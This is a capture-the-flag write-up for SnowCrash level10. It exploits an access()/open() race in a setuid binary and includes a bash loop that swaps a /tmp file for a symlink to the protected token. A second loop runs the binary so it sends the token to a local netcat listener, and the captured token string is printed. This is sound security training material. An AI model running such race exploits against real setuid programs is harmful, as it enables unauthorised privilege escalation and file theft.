```bash
level10@SnowCrash:~$ ll
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 ./
d--x--x--x  1 root    users     340 Aug 30  2015 ../
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout*
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc*
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
-r-x------  1 level10 level10   675 Apr  3  2012 .profile*
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```
This is the first of the 5 bonuses, this one is not as simple as the other levels.
So we see a binary file again, Let's decompile it.

Once decompiled we have 2 arguments needed once is a file which has the access function done to it
So here are two problems, first we can't lauch the server on any ip.
How to find it ?
```bash
level10@SnowCrash:~$ ifconfig
eth3      Link encap:Ethernet  HWaddr 08:00:27:95:0c:93
          inet addr:192.168.1.22  Bcast:192.168.1.255  Mask:255.255.255.0
          inet6 addr: 2a01:e0a:a47:ce00:dd93:78f9:5bdc:f843/64 Scope:Global
          inet6 addr: 2a01:e0a:a47:ce00:a00:27ff:fe95:c93/64 Scope:Global
          inet6 addr: fe80::a00:27ff:fe95:c93/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:28324 errors:0 dropped:0 overruns:0 frame:0
          TX packets:38383 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:1974364 (1.9 MB)  TX bytes:5325830 (5.3 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:39260 errors:0 dropped:0 overruns:0 frame:0
          TX packets:39260 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:2125191 (2.1 MB)  TX bytes:2125191 (2.1 MB)
```
the interesting part is 192.168.1.22 (the same one as the one which you connected to the ssh connection)
Ok now we have this cool but The second problem is we clearly have to give the token file to the level10 BUUUUUUTTT because of access
we can't so how can we do ?

```bash
Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit
the short time interval between checking and opening the file to manipulate it.  For this reason, the use of this system call should be avoided.
```
So If we just go really fast (not a human scale) we can make the access function AND THEN instantly switch to the token.

How to do that.

Let's take the first ssh connection,
We will make a script that will be made to create a file in the /tmp, then rm it, then create a symbolic link with the same name as the old file
then remove it then do it all again.

```bash
#!/bin/bash

while true; do
    touch /tmp/test
    rm -fr /tmp/test
    ln -s /home/user/level10/token /tmp/test
    rm -fr /tmp/test
done
```
ok so that will be the first ssh connection
now we need something to be reading the server
To do so we will use nc.
What are the flag needed,
when we take a look at the man we have the -l that is used to listen instead of initiating a connection
is it enough ?
Nop the -k will be useful to so that the connection doesn't close once we have written something (we can write other things than the flag too so..)

Good job now we have two choices, first we just spam this command by hand:
level10 /tmp/test 192.168.1.22
but it could be really long so let's do an other script !!

```bash
#! /bin/bash

while true; do
    /home/user/level10/level10 /tmp/test 192.168.1.22
done
```

now if the three ssh connection keep running everything, 
good job at some point, this will appear
woupa2yuojeeaaed06riuj63c
and now we can switch user flag10
GGG
